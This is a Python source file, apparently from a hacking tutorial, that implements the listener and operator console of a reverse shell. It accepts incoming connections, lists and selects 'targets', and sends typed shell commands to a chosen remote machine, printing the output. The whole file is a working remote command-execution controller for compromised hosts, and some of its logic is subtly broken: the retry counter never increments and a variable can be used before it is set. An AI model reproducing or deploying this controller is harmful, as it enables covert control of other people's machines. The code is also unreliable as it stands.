# Written by FoxSinOfGreed1729
# Many Thanks to TheNewBoston
import socket


all_conn = []
# this stored the connection object
all_addr = []


# this stores the IPs

# Create a socket allowing us to connect to client
def socket_create():
    try:
        global host
        global port
        global s
        host = 'localhost'
        # Host empty coz we're creating a server, the host will connect back
        port = 9991
        # Some Random port
        s = socket.socket()
        # Created the actual socket
    except socket.error as msg:
        print('Error in socket creation' + str(msg))


# now we'll bind the port info to the socket
def socket_bind():
    flag = 0
    try:
        global host
        global port
        global s
        print('Binding socket to port ' + str(port))
        s.bind((host, port))
        s.listen(10)
        # Number of bad connections it'll accept before stopping
    except socket.error as msg:
        print('Socket binding error ' + str(msg))
        print('Retrying......')
        if flag > 5:
            socket_bind()


# Till now, We only listened for connections but now, we'll actually accept the connection
# Establish a connection with client
# Socket needs to be listening to accept connections

def socket_accept():
    conn, addr = s.accept()
    # This will wait until connection has been Established
    print('Connection Established at IP ' + addr[0] + 'And Port ' + str(addr[1]))
    # Addr is info about the connections
    # Conn is a reference to the connection itself
    all_conn.append(conn)
    all_addr.append(addr[0])
    print(all_addr)


# function for interactive prompt
def prompt():
    while True:
        cmd = input('#')
        if cmd == 'list':
            list_conn()
        elif 'select' in cmd:
            conn = get_tgt(cmd)
        elif cmd == 'connect':
            send_command(conn)
        elif cmd == 'quit':
            print('Closing all connections, preparing to quit ')
            for conn_obj in all_conn:
                conn_obj.close()
                s.close()
            exit()
            quit()
        else:
            print('Command not recognized')


def list_conn():
    results = ''
    for i, conn in enumerate(all_conn):
        try:
            # testing for valid connections
            conn.send(str.encode('   '))
            conn.recv(2048)
        except:
            del all_conn[i]
            del all_addr[i]
            continue
        results += str(i) + '    ' + str(all_addr[i]) + '\n'
    print('-----Clients-------')
    print(results)


def get_tgt(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_conn[target]
        print("Target selected is    " + str(all_addr[target]))
        return conn
    except:
        print("something went wrong, please try again")
        return None


# Function to send commands
def send_command(conn):
    while True:
        try:
            wd = str(conn.recv(2048), "utf-8")
            print(wd, end='')
            cmd = input(">>>")
            if cmd == 'quit':
                break
                # A thing to remember is that stuff that's taken as input isn't bytes
                # It's in byte type so we'll have to convert it to string manually
                # Whenever we want to print it out to the user, it needs to be string
                # Whenever we need to send it over the network, it needs to be bytes
                # All stuff that comes fro the command line or the process itself is bytes
            if len(cmd) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(2048), "utf-8")
                # 2048 is the buffer size and utf is basic character encoding for a string
                print(client_response, end='')
                # the end keyword is to not shift the cursor to a new line
        except:
            print("Something went wrong while remote command execution")


def main():
    socket_create()
    socket_bind()
    socket_accept()
    prompt()

main()
